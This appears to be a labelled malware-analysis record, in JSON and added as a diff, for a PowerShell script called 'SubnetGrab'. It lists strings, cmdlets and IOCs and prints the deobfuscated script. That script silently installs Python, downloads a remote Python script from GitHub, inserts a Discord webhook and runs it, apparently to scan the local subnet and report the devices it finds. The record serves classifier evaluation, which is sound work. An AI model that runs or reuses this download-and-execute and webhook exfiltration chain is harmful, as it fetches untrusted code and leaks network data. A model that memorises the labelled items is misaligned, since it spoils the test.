@@ -1,0 +1,134 @@
+{
+  "meta": {
+    "quelldatei": "tech_051_SubnetGrab(PYTHON).ps1",
+    "sha256": "92105fde5d96a397b465852ac9dcfbabc59981c1b33d02f71f71104e5035fe2e",
+    "groesse_bytes": 1663,
+    "zeilen": 40,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "py.exe",
+      "Python is not installed. Installing Python...",
+      "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe",
+      "python_installer.exe",
+      "/quiet InstallAllUsers=1 PrependPath=1",
+      "Python is already installed.",
+      "Programs/Python/Python39/Scripts/pip.exe",
+      "Pip is not installed. Installing Pip...",
+      "https://bootstrap.pypa.io/get-pip.py",
+      "get-pip.py",
+      "Pip is already installed.",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Subnet%20Device%20Grab/SubnetGrab.py",
+      "YOUR DISCORD WEBHOOK HERE",
+      "SubnetGrab.py"
+    ],
+    "string_anzahl_gesamt": 18,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "py.exe",
+      "Python is not installed. Installing Python...",
+      "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe",
+      "python_installer.exe",
+      "/quiet InstallAllUsers=1 PrependPath=1",
+      "Python is already installed.",
+      "Programs/Python/Python39/Scripts/pip.exe",
+      "Pip is not installed. Installing Pip...",
+      "https://bootstrap.pypa.io/get-pip.py",
+      "get-pip.py",
+      "Pip is already installed.",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Subnet%20Device%20Grab/SubnetGrab.py",
+      "YOUR DISCORD WEBHOOK HERE",
+      "SubnetGrab.py"
+    ],
+    "string_anzahl_gesamt": 18,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Invoke-WebRequest",
+      "Join-Path",
+      "Remove-Item",
+      "Select-Object",
+      "Set-Content",
+      "Start-Process",
+      "Subnet-Grab",
+      "Test-Path",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "invoke_webrequest": 3,
+      "start_process": 1
+    },
+    "iocs": {
+      "urls": [
+        "https://bootstrap.pypa.io/get-pip.py",
+        "https://raw.githubusercontent.com/calinux-py/Python/main/Subnet%20Device%20Grab/SubnetGrab.py",
+        "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:LOCALAPPDATA",
+        "$env:SYSTEMROOT"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "py.exe",
+      "Python is not installed. Installing Python...",
+      "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe",
+      "python_installer.exe",
+      "/quiet InstallAllUsers=1 PrependPath=1",
+      "Python is already installed.",
+      "Programs/Python/Python39/Scripts/pip.exe",
+      "Pip is not installed. Installing Pip...",
+      "https://bootstrap.pypa.io/get-pip.py",
+      "get-pip.py",
+      "Pip is already installed.",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Subnet%20Device%20Grab/SubnetGrab.py",
+      "YOUR DISCORD WEBHOOK HERE",
+      "SubnetGrab.py"
+    ],
+    "string_anzahl_gesamt": 18,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Invoke-WebRequest",
+      "Join-Path",
+      "Remove-Item",
+      "Select-Object",
+      "Set-Content",
+      "Start-Process",
+      "Subnet-Grab",
+      "Test-Path",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "invoke_webrequest": 3,
+      "start_process": 1
+    },
+    "iocs": {
+      "urls": [
+        "https://bootstrap.pypa.io/get-pip.py",
+        "https://raw.githubusercontent.com/calinux-py/Python/main/Subnet%20Device%20Grab/SubnetGrab.py",
+        "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:LOCALAPPDATA",
+        "$env:SYSTEMROOT"
+      ]
+    },
+    "deobfuskiert_auszug": "function Subnet-Grab {\r\n    param (\r\n        [string]$discordWebhook\r\n    )\r\n    \r\n    # Check if Python is installed\r\n    if (-not (Test-Path (Join-Path $env:SYSTEMROOT \"py.exe\"))) {\r\n        Write-Host \"Python is not installed. Installing Python...\"\r\n        Invoke-WebRequest -Uri \"https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe\" -OutFile \"python_installer.exe\"\r\n        Start-Process -Wait -FilePath \"python_installer.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1\"\r\n        Remove-Item \"python_installer.exe\"\r\n    } else {\r\n        Write-Host \"Python is already installed.\"\r\n    }\r\n    \r\n    # Check if pip is installed\r\n    if (-not (Test-Path (Join-Path $env:LOCALAPPDATA \"Programs/Python/Python39/Scripts/pip.exe\"))) {\r\n        Write-Host \"Pip is not installed. Installing Pip...\"\r\n        Invoke-WebRequest -Uri \"https://bootstrap.pypa.io/get-pip.py\" -OutFile \"get-pip.py\"\r\n        py.exe get-pip.py\r\n        Remove-Item \"get-pip.py\"\r\n    } else {\r\n        Write-Host \"Pip is already installed.\"\r\n    }\r\n    \r\n    # Install required Python packages\r\n    py.exe -m pip install scapy netifaces\r\n    \r\n    # Download and modify the Python script\r\n    $pythonScript = Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/calinux-py/Python/main/Subnet%20Device%20Grab/SubnetGrab.py\" | Select-Object -ExpandProperty Content\r\n    $pythonScript = $pythonScript -replace \"YOUR DISCORD WEBHOOK HERE\", $discordWebhook\r\n    Set-Content -Path \"SubnetGrab.py\" -Value $pythonScript\r\n    \r\n    # Execute the Python script\r\n    py.exe SubnetGrab.py\r\n}\r\n\r\n# Example function call\r\n#Subnet-Grab -discordWebhook \"YOUR DISCORD WEBHOOK HERE\"\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Web-Anfrage senden",
+      "Prozess starten"
+    ]
+  }
+}
